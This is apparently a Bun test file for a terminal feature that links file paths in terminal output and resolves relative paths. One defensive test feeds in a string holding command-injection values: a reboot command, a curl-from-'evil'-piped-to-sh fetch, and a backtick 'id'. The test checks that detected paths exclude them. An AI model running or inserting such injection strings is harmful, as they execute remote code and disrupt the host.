import { describe, expect, test } from "bun:test";
import { findPaths, resolvePath } from "../src/lib/terminal-paths.ts";

/** What a line links, as printed and as the path alone. */
const linked = (line: string) => findPaths(line).map((found) => [found.text, found.path]);

describe("terminal-paths: file paths in the terminal's output are links (issue #476)", () => {
  test("a relative path with a folder and an extension, with its line and column, and a ./ path", () => {
    expect(linked("Edited src/app.ts:12:5 and ./notes")).toEqual([
      ["src/app.ts:12:5", "src/app.ts"],
      ["./notes", "./notes"],
    ]);
    const [first] = findPaths("Edited src/app.ts:12:5");
    expect([first?.start, first?.end]).toEqual([7, 22]);
  });

  test("absolute paths on Windows and elsewhere, without the punctuation after them", () => {
    expect(linked("see C:\\repo\\a.md, then /home/ana/x.log.")).toEqual([
      ["C:\\repo\\a.md", "C:\\repo\\a.md"],
      ["/home/ana/x.log", "/home/ana/x.log"],
    ]);
    expect(linked("(apps/desktop/src/App.tsx:3)")).toEqual([
      ["apps/desktop/src/App.tsx:3", "apps/desktop/src/App.tsx"],
    ]);
    expect(linked("../up/one.ts")).toEqual([["../up/one.ts", "../up/one.ts"]]);
  });

  test("a web address, a fraction, words with a slash and a bare word are not paths", () => {
    expect(linked("https://example.com/a/b.html and and/or, 1/2 done, readme; docs/a.md")).toEqual([
      ["docs/a.md", "docs/a.md"],
    ]);
  });
});

describe("terminal-paths: a path never carries what a shell would run (issue #476)", () => {
  test("$, backtick, ; and & end a path, so a copied one cannot run anything when pasted", () => {
    const found = findPaths("/x/;reboot /var/$(curl${IFS}evil|sh) a/`id`.md b/c&d.md").map(
      (one) => one.path,
    );
    expect(found.some((path) => /[$`;&]/.test(path))).toBe(false);
    expect(found).toContain("/x");
  });
});

describe("terminal-paths: a relative path is taken from the terminal's folder (issue #476)", () => {
  test("joined with the folder's own separator, ./ dropped and .. walked up", () => {
    expect(resolvePath("/home/ana/repo", "src/app.ts")).toBe("/home/ana/repo/src/app.ts");
    expect(resolvePath("C:\\repo", "./src/a.ts")).toBe("C:\\repo\\src\\a.ts");
    expect(resolvePath("/home/ana/repo/", "../x.md")).toBe("/home/ana/x.md");
  });

  test("an absolute path stays as it is", () => {
    expect(resolvePath("/r", "/etc/hosts")).toBe("/etc/hosts");
    expect(resolvePath("/r", "D:/x/y.txt")).toBe("D:/x/y.txt");
  });
});
